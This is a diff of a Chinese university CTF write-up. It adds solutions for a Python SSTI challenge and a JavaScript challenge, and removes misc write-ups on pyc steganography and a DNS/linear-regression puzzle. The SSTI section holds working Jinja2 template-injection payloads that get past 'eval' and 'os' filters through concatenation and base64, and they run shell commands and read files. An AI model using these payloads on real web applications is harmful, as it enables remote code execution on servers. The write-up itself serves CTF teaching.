@@ -1,6 +1,6 @@
 [TOC]  
 
-# Web
+# Web  
 
 ##	真的签到 (28 solves)
 
@@ -15,6 +15,57 @@
 这个题主要是想考察信息安全的同学对于近期 Web 漏洞的关注度，这个 Web 漏洞就是 CVE-2021-43798 （这是一个漏洞编号），这个漏洞在 2021/12/07 号左右在互联网上被披露，NUAACTF 是 2021/12/11 ，日子比较接近，也符合我想考察地同学们对于 Web 漏洞跟进的能力。并且为了降低整体比赛难度，减轻同学们的压力，所以没有设置其他特别复杂的漏洞。
 
 （问题来了，为啥不用 12/09 晚上爆出的 Log4j 漏洞呢？因为忙不过来，环境弄不过来2333
+
+## baby_python
+
+ssti+简单绕过
+
+过滤了eval和os，用拼接绕过或是编码绕过都可以
+
+1.拼接绕过
+
+利用一些可利用的类，读取文件列表
+
+![web0](./img/web0.png)
+
+再把它读出来
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['o'+'s'].popen('cat ./flllll11111114aaaaaggggggggggggg').read()}}
+```
+
+因为环境是python2的，可以使用file类读
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[40]('flllll11111114aaaaaggggggggggggg').read()}}
+```
+
+or用`__builtins__`
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[71].__init__.__globals__.__builtins__['open']('flllll11111114aaaaaggggggggggggg').read()}}
+```
+
+or改一下通用payload：
+
+```
+?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'ev'+'al' in b.keys() %}{{ b['ev'+'al']('__import__("o"+"s").popen("cat flllll11111114aaaaaggggggggggggg").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}
+```
+
+2.编码绕过
+
+把被过滤的部分base64一下
+
+```
+?name={{().__class__.__mro__[1].__subclasses__()[71].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IGZsbGxsbDExMTExMTE0YWFhYWFnZ2dnZ2dnZ2dnZ2dnJykucmVhZCgp".decode('base64'))}}
+```
+
+## Twister
+
+(原定的白给题)
+本意就是让修改前端js，运行即可，但是混淆没有做好，可以直接看到请求的文件，所以总结是有两种方法可以解本题
+1.将function一串代码复制下来，修改`r=10`，放入控制台中运行，点击按钮就发现能打到随机数，控制台会输出`where is your flag`， 在NetWork中找到f111444g.php并查看cookie即可
+2.直接在混淆代码中找到请求的文件，访问，查看cookie即可
 
 ##	Make Me Cry (0 solves)
 
@@ -198,309 +249,7 @@ Anyway，祝贺本次竞赛取得优异成绩的队伍，暂时落后的队伍�
 
 根据提示，发现 `NU` 后面的字符都比特翻转了，还原即可，之后得到一个音频文件，还是根据提示可以知道国际空间站常用 PD-120 模式发送 SSTV，用相应的软件（比如 Robot36）解码即可。
 
-
-
-## Try2FindMe
-
-> ***1 solve, 1000 pts***
->
-> **出题人：**[MiaoTony](https://miaotony.xyz/)
->
-> 喵喵能有什么秘密呢？
-> 快来找一找吧！
->
-> 附件地址： https://www.lanzouw.com/iMbHaxgzqvg
->
-> > **Hint1:** 嘻嘻，如果差一半 key 的话，悄悄告诉你，有隐写！
-> >
-> > **Hint2:** pyc 隐写 python 3.7.11
-> >
-> > **Hint3:** 最后的 AES 跑不出来可能是 python 依赖版本不一样导致锅了，问题不大，找个在线的 AES 解密就行
-
-### 解题步骤
-
-开局是一张猫猫图。
-
-![try2findme](img/try2findme.jpg)
-
-图片种，binwalk / foremost / 人工手动分离得到一个压缩包，解压得到一个 `1.pyc`。
-
-![](img/image-20211217035317361.png)
-
-pyc 字节码反编译可以用 uncompyle6 或者 decompyle3
-
-```bash
-uncompyle6 -o 1.py 1.pyc
-```
-
-甚至这里可以用 [在线的反编译](https://tool.lu/pyc/)（
-
-源码如下
-
-```python
-from Crypto.Cipher import AES
-import binascii
-
-def decrypt(x, cipher):
-    key = x + 'n0lve3t6r1s'
-    try:
-        aes = AES.new(key.rjust(24, 'A'), AES.MODE_ECB)
-        cipher = binascii.unhexlify(cipher)
-        flag = aes.decrypt(cipher).decode()
-        return flag
-    except:
-        return ''
-
-
-def main():
-    c = '29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805'
-    k = input('Please input your key: ')
-    flag = decrypt(k, c)
-    if 'flag' in flag:
-        print('Wow, you find it!!!')
-    else:
-        print('Oh no!!!')
-
-
-if __name__ == '__main__':
-    main()
-```
-
-发现还差了 AES 加解密用到的 key 的一部分。
-
-根据提示，考虑是 pyc 隐写 https://github.com/AngelKitty/stegosaurus
-
-然而直接跑可能会跑不出来，会报错 `ValueError: bad marshal data`
-
-![](img/image-20211217035355284.png)
-
-于是又根据提示是 python 3.7.11（其实可以看 magic number），是高版本的 python 了，根据经验 header 长度是 16.
-
-于是根据报错的提示魔法改一改第124行这里。
-
-![](img/try2findme_wp1.png)
-
-运行得到隐写的结果
-
-```bash
-$ python3 stegosaurus.py 1.pyc -x         
-Extracted payload: bytearray(b'k5fgb2eur5sty')
-```
-
-cipher: `29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805`
-
-input 为 pyc 隐写的 `k5fgb2eur5sty`
-
-直接运行 py / pyc 需要 Crypto 库，最好用 [pyenv](https://github.com/pyenv/pyenv) 新建一个 python 3.7.11 的虚拟环境，然后在里面装。
-
-```bash
-pip3 install pycryptodome
-```
-
-比赛的时候有选手反馈跑出来发现还是 `Oh no!!!`，看了一下发现可能是 python 以及依赖版本不对应，str 处理的时候出了点锅。
-
-于是放了个 hint 说可以找个在线工具来解。
-
-按照代码的意思拼接得到 AES key: `k5fgb2eur5styn0lve3t6r1s`
-
-最后 AES ECB 解密得到 flag
-
-`flag{M15c_1s_r34l1y_fuNny_ha233}`
-
-![](img/image-20211217040006853.png)
-
-（这里用的是 http://aes.online-domain-tools.com/
-
-
-
-### 出题思路
-
-校赛来了，要出题了，看队里其他师傅出了比较常规的 LSB、emoji-aes、base编码、压缩包伪加密、音频隐写什么的，以及《我们生活在南京》系列无线电的题目，在想咱出点什么比较好呢。
-
-一想，今年强网杯线上赛的时候就 [有一道名叫 ExtremelySlow 的题目包含了 pyc 隐写](https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#ExtremelySlow)，当时用到的是 python 3.10，由于现成的反编译工具还不支持那么高版本直接还原出 python 源码，和队友手逆特别辛苦 *（摊手.jpg*
-
-**于是就出一题 pyc 隐写吧！**
-
-但是毕竟是校赛，不想出得太难，就没考虑用特别高版本的 Python，比如 Python 3.9 3.10 那种版本，最后是整了个 python3.7.11 这个相对而言比较新的版本。这样的话不需要选手手逆 pyc，但是 stegosaurus 不能直接用需要魔改，考点就在这里了。
-
-比赛的时候校内也有几队把 pyc 反编译好了，也知道用 stegosaurus 隐写的了，但还是卡在这个魔改 header 长度上了。校外的话 Z 师傅发现了这个问题改了之后成功得到了隐写的密钥，不过发现跑不通，所以最后放了个提示说可以拿在线工具来了。
-
-
-
-## ItIsMath
-
-> ***1 solve, 1000 pts***
->
-> **出题人：**[MiaoTony](https://miaotony.xyz/)
->
-> It is math, but it is not only math. 
->
-> Maybe you can find something in the domain ~~**itismath.asurictf2021.miaotony.xyz**~~ 
->
-> Do you remember the last NUAACTF? 
->
-> Update: The domain is changed to **itismath2.asurictf2021.miaotony.xyz**
->
-> > **Hint1:** domain TXT
-> >
-> > **Hint2:** Update: The domain is changed to **itismath2.asurictf2021.miaotony.xyz**
-> >
-> > 原域名得到含有 `ctf.asuri.club` 的字符串可以找出题人换文件
-> >
-> > **Hint3:** 线性回归
-
-### 解题步骤
-
-这里看更新后的域名吧。
-
-首先这个域名是访问不了的，比赛群里有选手问了，回复了说是正常的。当然进一步看发现甚至没有A、AAAA解析。
-
-那自然想到是 TXT 解析了，后面也放了 hint。
-
-```bash
-$ dig itismath2.asurictf2021.miaotony.xyz TXT +short @1.0.0.1 | sed 's/[" ]//g'
-OBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUWWYJAOBUXA2JAOBUSA4DJOBUSA4DJEBYGSIDQNEQHA2LQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJMNUHKIDQNFRWQ5JAOBUWG2DVEBYGSY3IOUQGWYJAMNUHKIDQNFYGSIDQNFYGSIDQNFYGSIDQNFYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUWWYLDNB2SA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBYGS23BMNUHKIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA4DJNNQWG2DVEBYGSY3IOUQHA2LDNB2SA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGS23BMNUHKIDQNFYGSIDQNFYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGS23BMNUHKIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2LLMFRWQ5JANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA4DJEBYGSIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJNNQWG2DVEBYGSY3IOUQHA2LDNB2SA4DJNNQWG2DVEBYGS4DJEBYGS4DJEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2LLMFRWQ5JAOBUWWYLDNB2SA===
-```
-
-很明显是 base32，解密一下
-
-```bash
-$ dig itismath2.asurictf2021.miaotony.xyz TXT +short @1.0.0.1 | sed 's/[" ]//g' | base32 -d
-pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu pichu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pipi pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pikachu pi pi pi pi pi pi pi pikachu pichu pichu pikachu pipi pipi ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pikachu
-```
-
-啊，是一堆的 pikachu！
-
-于是想到是 [Pikalang / pikalang-language](https://www.dcode.fr/pikalang-language)，这个比赛的时候也在比赛群里放了 hint。
-
-> Tool for decoding / encoding in Pikalang. Pikalang (or Pikachu language) is a minimalist programming language based on the Brainfuck for which  it substitutes the signs by the syllables of Pikachu.
->
-> Pikalang is a programming language based on the [BrainFuck](https://www.dcode.fr/brainfuck-language) language but whose operators are substituted by the cries of the Pokemon Pikachu. Thus, from a code written in [BrainFuck](https://www.dcode.fr/brainfuck-language), the following table helps to match the code in Pikalang:
->
-> | +    | pi      |
-> | ---- | ------- |
-> | -    | ka      |
-> | >    | pipi    |
-> | <    | pichu   |
-> | [    | pika    |
-> | ]    | chu     |
-> | .    | pikachu |
-> | ,    | pikapi  |
->
-> Example:  The Pikalang program `pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu  ka chu pipi pipi pipi pi pi pi pi pi pi pi pi pi pi pikachu pipi pi pi  pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka pikachu ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pi pi pikachu ka pikachu`  corresponds to BF code `++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++.>+++++++++++.----.------.++++++++.++.-.` and should output the [ASCII](https://www.dcode.fr/ascii-code) characters `Pokemon`
->
-> 其实就是 BrainFuck 换了个编码表（
-
-直接在网页上执行，得到另一个域名 itismath.vercel.app
-
-![](img/image-20211217042628874.png)
-
-访问得到一堆数字，或者说一个矩阵。
-
-```
-[(251, 25711.438), (393, 40195.541), (177, 18162.627), (318, 32544.988), (471, 48151.807), (170, 17448.789), (469, 47947.733), (428, 43765.255), (65, 6738.41), (291, 29790.762), (350, 35809.283), (151, 15510.828), (203, 20815.487), (196, 20101.064), (228, 23365.239), (34, 3576.204), (150, 15408.508), (53, 5514.259), (392, 40092.417), (212, 21732.801), (226, 23160.389), (362, 37032.44), (314, 32137.56), (283, 28975.046), (437, 44683.716), (463, 47335.627), (176, 18060.901), (182, 18672.449), (245, 25098.485), (322, 32953.074)]
-[(315, 30659.028), (79, 7766.519), (349, 33957.654), (294, 28622.323), (399, 38806.382), (40, 3983.567), (54, 5341.251), (313, 30464.785), (135, 13198.723), (483, 46955.973), (391, 38032.457), (71, 6990.395), (51, 5050.41), (311, 30271.461), (457, 44432.214), (392, 38128.872), (320, 31143.177), (258, 25129.776), (472, 45887.894), (18, 1849.403), (206, 20085.75), (442, 42978.708), (195, 19018.715), (74, 7281.578), (306, 29785.452), (116, 11355.545), (491, 47730.532), (172, 16787.549), (52, 5147.612), (316, 30756.23)]
-[(418, 51471.916), (432, 53194.178), (67, 8298.618), (470, 57869.16), (473, 58237.061), (78, 9651.542), (350, 43108.093), (24, 3009.174), (57, 7068.255), (45, 5592.309), (132, 16293.547), (312, 38433.309), (111, 13710.512), (196, 24165.246), (162, 19983.339), (113, 13956.568), (249, 30685.306), (466, 57377.563), (76, 9405.55), (456, 56145.491), (381, 46920.932), (32, 3993.124), (61, 7560.342), (22, 2763.37), (200, 24657.32), (332, 40895.039), (20, 2517.183), (339, 41754.346), (7, 918.143), (427, 52579.973)]
-[(491, 33442.231), (458, 31197.978), (175, 11952.617), (415, 28273.888), (59, 4064.374), (384, 26165.806), (461, 31401.368), (114, 7804.803), (298, 20316.548), (259, 17665.479), (7, 528.412), (314, 21404.044), (256, 17460.416), (353, 24056.761), (243, 16577.595), (422, 28748.164), (332, 22628.649), (421, 28681.826), (313, 21337.49), (156, 10660.488), (202, 13789.358), (198, 13516.644), (151, 10320.372), (216, 14741.23), (291, 19841.042), (288, 19637.266), (425, 28954.543), (91, 6240.096), (434, 29565.843), (355, 24192.317)]
-[(72, 7400.724), (79, 8114.246), (179, 18314.96), (322, 32901.375), (433, 44223.767), (245, 25047.021), (399, 40754.275), (491, 50139.317), (125, 12806.721), (182, 18620.374), (259, 26475.651), (325, 33207.992), (463, 47283.006), (368, 37593.175), (427, 43612.087), (291, 29738.352), (213, 21782.567), (442, 45142.345), (16, 1688.087), (283, 28923.066), (305, 31166.391), (339, 34635.62), (167, 17090.158), (223, 22802.122), (416, 42489.428), (10, 1076.395), (489, 49935.196), (449, 45855.695), (371, 37898.19), (94, 9644.64)]
-[(116, 11764.956), (494, 49944.273), (303, 30651.417), (451, 45600.484), (408, 41257.93), (422, 42672.458), (19, 1967.13), (102, 10350.819), (496, 50146.609), (347, 35096.092), (228, 23076.577), (186, 18835.061), (270, 27318.813), (53, 5401.371), (421, 42570.209), (407, 41157.05), (317, 32066.904), (276, 27925.013), (259, 26207.727), (453, 45801.337), (446, 45095.346), (166, 16814.285), (323, 32672.829), (178, 18026.726), (60, 6108.255), (12, 1260.339), (29, 2977.287), (450, 45498.85), (492, 49741.281), (218, 22066.439)]
-[(370, 37785.878), (278, 28401.607), (166, 16977.836), (224, 22894.401), (26, 2697.274), (110, 11265.689), (39, 4023.362), (379, 38703.214), (249, 25443.357), (266, 27178.394), (204, 20853.983), (179, 18303.84), (474, 48394.45), (444, 45334.086), (254, 25954.622), (420, 42885.767), (338, 34522.488), (22, 2289.323), (58, 5961.562), (15, 1575.394), (315, 32175.988), (29, 3003.186), (17, 1779.083), (465, 47477.351), (119, 12183.245), (363, 37072.61), (19, 1983.228), (395, 40336.878), (164, 16773.53), (380, 38805.324)]
-[(254, 12543.323), (44, 2253.348), (236, 11662.079), (395, 19453.074), (91, 4556.232), (315, 15532.771), (439, 21608.869), (32, 1665.213), (380, 18719.16), (272, 13425.484), (27, 1420.445), (356, 17543.092), (371, 18277.529), (353, 17395.328), (295, 14553.08), (338, 16659.262), (183, 9065.033), (374, 18424.299), (142, 7055.199), (234, 11564.408), (8, 489.253), (98, 4899.279), (120, 5977.687), (302, 14895.733), (390, 19208.331), (267, 13181.005), (423, 20825.516), (156, 7741.71), (122, 6075.745), (21, 1126.293)]
-[(150, 8016.821), (227, 12098.139), (261, 13900.307), (162, 8652.414), (95, 5101.549), (272, 14483.247), (43, 2345.185), (63, 3405.18), (476, 25294.643), (294, 15648.955), (481, 25560.142), (219, 11673.944), (163, 8705.953), (7, 437.04), (466, 24764.492), (147, 7857.726), (36, 1974.507), (490, 26038.59), (202, 10773.071), (330, 17556.469), (467, 24819.432), (23, 1285.311), (32, 1762.25), (85, 4571.556), (374, 19889.562), (355, 18882.738), (72, 3882.575), (48, 2610.335), (329, 17504.714), (364, 19358.515)]
-[(257, 14718.98), (475, 27144.037), (81, 4686.244), (109, 6282.843), (361, 20647.935), (50, 2919.492), (135, 7764.347), (21, 1266.265), (216, 12382.091), (430, 24580.106), (491, 28057.66), (87, 5028.474), (19, 1152.178), (382, 21844.316), (104, 5997.644), (232, 13293.29), (416, 23783.295), (342, 19564.978), (18, 1095.401), (176, 10102.126), (309, 17682.211), (157, 9019.065), (54, 3147.231), (158, 9076.081), (69, 4002.583), (127, 7308.433), (379, 21673.285), (431, 24638.424), (473, 27030.564), (90, 5199.474)]
-[(420, 21473.665), (265, 13568.853), (355, 18158.695), (301, 15405.389), (443, 22646.266), (120, 6173.475), (24, 1277.359), (305, 15609.581), (380, 19433.319), (229, 11733.252), (52, 2705.139), (410, 20964.551), (91, 4694.106), (266, 13620.62), (307, 15711.523), (459, 23463.426), (213, 10916.687), (180, 9233.946), (236, 12089.643), (376, 19230.199), (440, 22494.488), (125, 6428.384), (31, 1634.331), (426, 21781.387), (153, 7856.98), (340, 17393.99), (33, 1736.392), (252, 12905.881), (386, 19739.766), (172, 8825.891)]
-[(342, 15488.351), (135, 6172.774), (459, 20752.223), (358, 16207.357), (478, 21608.604), (103, 4732.814), (137, 6262.325), (269, 12203.375), (349, 15802.51), (411, 18594.199), (256, 11618.489), (270, 12248.129), (26, 1267.293), (17, 862.047), (361, 16342.428), (319, 14453.75), (427, 19312.302), (88, 4057.426), (328, 14859.053), (476, 21518.765), (399, 18053.591), (149, 6802.205), (28, 1357.121), (201, 9142.807), (50, 2347.035), (470, 21248.937), (97, 4462.399), (66, 3067.299), (344, 15578.997), (374, 16927.668)]
-[(212, 21514.787), (184, 18686.931), (415, 42017.302), (140, 14242.375), (275, 27877.595), (479, 48482.414), (441, 44645.368), (166, 16868.404), (205, 20807.994), (257, 26059.839), (360, 36463.631), (15, 1617.407), (357, 36159.891), (35, 3637.187), (255, 25858.387), (12, 1314.057), (288, 29191.522), (390, 39493.551), (267, 27069.547), (492, 49795.329), (269, 27271.675), (470, 47573.564), (347, 35149.842), (408, 41311.623), (71, 7273.644), (142, 14444.819), (456, 46158.953), (174, 17676.401), (474, 47977.879), (280, 28383.58)]
-[(404, 19495.358), (12, 678.245), (270, 13062.555), (237, 11478.449), (283, 13687.52), (248, 12006.987), (94, 4614.53), (419, 20214.805), (61, 3030.327), (21, 1110.239), (482, 23240.86), (49, 2454.045), (382, 18439.282), (426, 20550.769), (221, 10710.661), (155, 7542.195), (416, 20071.565), (55, 2742.353), (276, 13351.515), (271, 13110.676), (152, 7398.707), (405, 19542.495), (57, 2838.079), (101, 4950.13), (316, 15270.601), (459, 22135.203), (183, 8886.061), (193, 9366.336), (319, 15415.446), (344, 16615.058)]
-[(327, 21683.004), (138, 9208.802), (495, 32770.797), (488, 32308.797), (385, 25512.246), (21, 1486.417), (92, 6172.598), (394, 26106.215), (366, 24257.571), (115, 7690.604), (258, 17129.751), (299, 19834.484), (110, 7360.251), (252, 16732.208), (392, 25973.952), (260, 17260.445), (447, 29602.432), (335, 22212.109), (332, 22012.98), (424, 28084.729), (68, 4588.479), (98, 6568.411), (402, 26632.436), (353, 23399.551), (204, 13565.172), (113, 7558.401), (274, 18184.341), (193, 12838.195), (342, 22673.414), (361, 23927.43)]
-[(20, 1098.278), (455, 22848.531), (131, 6648.615), (488, 24500.666), (48, 2498.193), (276, 13899.408), (28, 1498.131), (86, 4398.853), (196, 9898.668), (326, 16398.231), (381, 19148.7), (63, 3248.501), (27, 1448.238), (386, 19399.918), (240, 12098.565), (239, 12048.603), (293, 14749.701), (363, 18248.92), (172, 8698.375), (181, 9148.851), (340, 17099.405), (265, 13349.585), (389, 19548.138), (469, 23548.322), (401, 20148.573), (353, 17749.481), (441, 22150.277), (163, 8248.245), (62, 3198.467), (436, 21899.306)]
-[(341, 23924.127), (184, 12933.254), (281, 19723.718), (428, 30013.631), (176, 12373.595), (364, 25533.587), (205, 14403.129), (60, 4253.335), (487, 34145.59), (112, 7893.573), (78, 5513.743), (472, 33094.006), (95, 6703.269), (199, 13984.079), (98, 6913.618), (66, 4673.34), (196, 13773.778), (104, 7333.186), (169, 11883.735), (274, 19234.415), (194, 13634.025), (266, 18673.773), (258, 18114.224), (166, 11673.939), (59, 4183.159), (413, 28964.462), (210, 14753.414), (155, 10903.648), (303, 21264.794), (390, 27353.912)]
-[(266, 17416.256), (417, 27231.231), (226, 14815.612), (154, 10135.945), (387, 25281.883), (232, 15205.465), (239, 15660.331), (17, 1230.284), (68, 4545.643), (20, 1425.137), (168, 11045.438), (93, 6170.171), (166, 10915.611), (26, 1815.332), (426, 27816.6), (81, 5390.485), (183, 12020.856), (156, 10265.989), (463, 30221.854), (45, 3050.258), (257, 16830.757), (271, 17740.921), (345, 22551.32), (289, 18910.733), (198, 12996.069), (332, 21705.53), (485, 31652.224), (203, 13320.834), (295, 19301.314), (14, 1035.21)]
-```
-
-18 行数据，每行一个 list，里面包含 30 个 tuple。
-
-结合题目名字和描述 `ItIsMath`，应该就是和数学有点关系，把数据当成坐标点，画一画可以发现每一行的点连起来都近似一条直线。
-
-后面也提示了是线性回归。
-
-于是建立一个线性回归模型，依次算出每条直线的斜率和截距，然后 `round` 取个整，转化为 ASCII，拼起来就是 flag。
-
-**Exp:**
-
-```python
-from sklearn.linear_model import LinearRegression
-import numpy as np
-
-with open('data.txt') as f:
-    a = f.read().splitlines()
-a = [eval(x) for x in a]
-
-ans = []
-for i in range(len(a)):
-    xx, yy = list(zip(*a[i]))
-    xx = np.array(xx).reshape(-1, 1)
-    yy = np.array(yy)
-    linear_regression = LinearRegression(normalize=True)
-    linear_regression.fit(xx, yy)
-    message = linear_regression.coef_[0]
-    # print(message)
-    ans.append(round(message))
-    y = linear_regression.intercept_
-    # print(y)
-    ans.append(round(y))
-
-print(bytes(ans))
-```
-
-得到 flag 
-
-`flag{9D4f8e0f-1a5B9E35-aef0fBd2bF5A}`
-
-当然也可以直接用 numpy 的 polyfit 来
-
-```python
-import numpy as np
-
-with open('data.txt') as f:
-    a = f.read().splitlines()
-data = [eval(x) for x in a]
-
-for points in data:
-    x = [_[0] for _ in points]
-    y = [_[1] for _ in points]
-    x = np.array(x)
-    y = np.array(y)
-    k, b = np.polyfit(x, y, 1)
-    print(chr(int(k)), end='')
-    print(chr(int(b)), end='')
-```
-
-
-
-### 出题思路
-
-这题其实是比赛前一天晚上到比赛当天凌晨出的。本来这题是可有可无的，毕竟 misc 题目已经不少了，可是喵喵想着就出了一题太少了，虽然那道题放在校赛可能有点难，但万一被秒了可不好，再出道难一点的吧。
-
-这题题目描述里的 `Do you remember the last NUAACTF? `，其实是因为上一届 NUAACTF *（在今年上半年，好像是因为疫情延期了，233）* 出了一题也用到了域名 TXT 记录的，这里相当于回顾一下。
-
-之所以 TXT 里放 base32，是因为之前出题有过某些情况下解析出来大小写会锅，而 base32 的话字母全是大写的就不存在这个问题了。
-
-至于 pikachu，当然 ta 是可爱啊，喵喵说是随意找然后正好看到的你信不信呢？确实是这样。
-
-这个 pikachu 在原来的域名执行的结果是 ctf.asuri.club:xxxxx，也就是平台上的一个端口，访问得到的是和 https://itismath.vercel.app/ 几乎一样的结果，但由于比赛的时候服务器被 DDoS 攻击了，之后救回来系统重启了，虽然配了 `restart=always`，不知道为啥部署的容器还是没了，考虑到稳定性和可靠性干脆直接一键部署到 vercel 好了。相应地也就换了个域名，为了让选手不白做题，就说能解出原来的域名也直接给下一步了。
-
-最后就是题目里说的 Math 了，线性回归，算是比较简单能想到的一个数学应用吧，甚至为了简单给相应系数加的噪声（随机数）都极小，这个拟合结果貌似都 R^2=1 了 *（好像是吧，懒得再看了*
-
-不过由于前面的步骤有点绕，比赛的时候问了选手进度，然后即使是疯狂放 hint，最后也只有一队校外的出了，校内也有一两队到线性回归这步骤但没时间解了，还是挺可惜的吧。
-
-另外，还有出题人的一些**运维故事和心得体会**，放在博客上了：[CTF | 2021 AsuriCTF / NUAACTF Misc 部分官方 WriteUp](https://miaotony.xyz/2021/12/16/CTF_2021AsuriCTF_NUAACTF_Misc/?utm_source=github_asuri)
-
-最后，**感谢大家来玩，希望大家都能有所收获喵~**
-
-
-
-# Rev
+# Rev  
 
 ## Legende Lof Links
 其实题目里面藏了一个`LLL`在里面  
